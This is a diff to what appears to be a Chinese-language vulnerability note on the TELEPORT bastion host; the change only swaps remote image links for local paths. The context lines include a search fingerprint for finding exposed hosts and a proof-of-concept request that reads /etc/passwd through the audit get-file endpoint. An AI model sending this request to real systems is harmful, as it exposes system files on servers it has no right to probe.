@@ -20,7 +20,7 @@ app="TELEPORT堡垒机"
 
 登录页面
 
-![image-20220824134958109](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241355622.png)
+![image-20220824134958109](./images/202208241355622.png)
 
 登录后使用POC验证
 
@@ -28,4 +28,4 @@ app="TELEPORT堡垒机"
 /audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&offset=0
 ```
 
-![image-20220824135554806](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241355866.png)
+![image-20220824135554806](./images/202208241355866.png)
